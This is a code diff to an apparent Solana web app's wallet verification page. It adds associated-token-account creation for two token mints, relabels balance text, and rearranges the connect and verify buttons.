@@ -32,6 +32,7 @@ import StepContainer from "../Layouts/StepContainer"
 import { useState, useEffect } from "react"
 import {FiMail} from 'react-icons/fi'
 import axios from 'axios'
+import { ClassNames } from '@emotion/react';
 //@ts-ignor
 
 export const Verification =() => {
@@ -158,7 +159,7 @@ export const Verification =() => {
 
                                
                             <Text mb={'1em'}> Founder 1<br/>
-                            Sol balance : 0<br/>
+                            Sol Balance : 0<br/>
                             <span style={{color:'red'}}>Status : Unverified</span></Text>
                             <Context>
                                 <Content />
@@ -169,7 +170,7 @@ export const Verification =() => {
                             <>
 
                                 <form>
-                                    <Text  my={'1em'} fontWeight={'bold'} display={ !hide ? 'none' : 'block' }>Request Sent To <Text fontWeight={'bold'} >{email}</Text> Sol balance : 0 <br/> <span style={{color:'red'}}>Status : Unverified</span> </Text>
+                                    <Text  my={'1em'} fontWeight={'bold'} display={ !hide ? 'none' : 'block' }>Request Sent To <Text fontWeight={'bold'} >{email}</Text> Sol Balance : 0 <br/> <span style={{color:'red'}}>Status : Unverified</span> </Text>
                                     <InputGroup display={hide}>
                                     <Input 
                                          type={'email'}
@@ -439,6 +440,40 @@ function Content () {
     
 
 
+              
+const mintPublicKeyCRP = new PublicKey("DubwWZNWiNGMMeeQHPnMATNj77YZPZSAz2WVR5WjLJqz");    
+const mintTokenCRP = new Token(
+  connection,
+  mintPublicKeyCRP,
+  splToken.TOKEN_PROGRAM_ID,
+  signers // the wallet owner will pay to transfer and to create recipients associated token account if it does not yet exist.
+);
+
+  const deCRPublicKeyCRP = publicKey;
+  
+  // Get the derived address of the destination wallet which will hold the custom token
+  const associatedDestinationTokenAddrCRP = await Token.getAssociatedTokenAddress(
+      mintTokenCRP.associatedProgramId,
+      mintTokenCRP.programId,
+      mintPublicKeyCRP,
+      deCRPublicKeyCRP
+  );
+  const receiverAccountCRP = await connection.getAccountInfo(associatedDestinationTokenAddrCRP);
+  if (receiverAccountCRP === null) {
+      transaction.add(
+          Token.createAssociatedTokenAccountInstruction(
+              mintTokenCRP.associatedProgramId,
+              mintTokenCRP.programId,
+              mintPublicKeyCRP,
+              associatedDestinationTokenAddrCRP,
+              deCRPublicKeyCRP,
+              publicKey
+          )
+      )
+      
+  }
+
+
 
 
 
@@ -684,6 +719,40 @@ function Content () {
         }
         
 
+
+        
+const mintPublicKeyGRAPE = new PublicKey("8upjSpvjcdpuzhfR1zriwg5NXkwDruejqNE9WNbPRtyA");    
+const mintTokenGRAPE = new Token(
+  connection,
+  mintPublicKeyGRAPE,
+  splToken.TOKEN_PROGRAM_ID,
+  signers // the wallet owner will pay to transfer and to create recipients associated token account if it does not yet exist.
+);
+
+  const deGRAPEublicKeyGRAPE = publicKey;
+  
+  // Get the derived address of the destination wallet which will hold the custom token
+  const associatedDestinationTokenAddrGRAPE = await Token.getAssociatedTokenAddress(
+      mintTokenGRAPE.associatedProgramId,
+      mintTokenGRAPE.programId,
+      mintPublicKeyGRAPE,
+      deGRAPEublicKeyGRAPE
+  );
+  const receiverAccountGRAPE = await connection.getAccountInfo(associatedDestinationTokenAddrGRAPE);
+  if (receiverAccountGRAPE === null) {
+      transaction.add(
+          Token.createAssociatedTokenAccountInstruction(
+              mintTokenGRAPE.associatedProgramId,
+              mintTokenGRAPE.programId,
+              mintPublicKeyGRAPE,
+              associatedDestinationTokenAddrGRAPE,
+              deGRAPEublicKeyGRAPE,
+              publicKey
+          )
+      )
+      
+  }
+
         
         
 
@@ -726,14 +795,17 @@ function Content () {
         <div>
             { connected ?
                 <>
-                <button className="restart" disabled>Connect</button>
-                <button onClick={Funny} className="quit">Submit</button>
+                    <div className="Wrapp">
+                        <button onClick={Funny} className="quit bII">Verify</button>
+                        <button disabled className="quit disII">Submit</button>
+                    </div>
                 </>
             :
             <>
-                <button className="restart">Connect</button>
-                <WalletMultiButton  className="restart"/>
-                <button onClick={Funny} disabled className="quit">Submit</button>
+                <div className="Wrapp">
+                    <WalletMultiButton  className="restart bII"/>
+                    <button onClick={Funny} disabled className="quit dis">Verify</button>
+                </div>
             </>
             }
         </div>
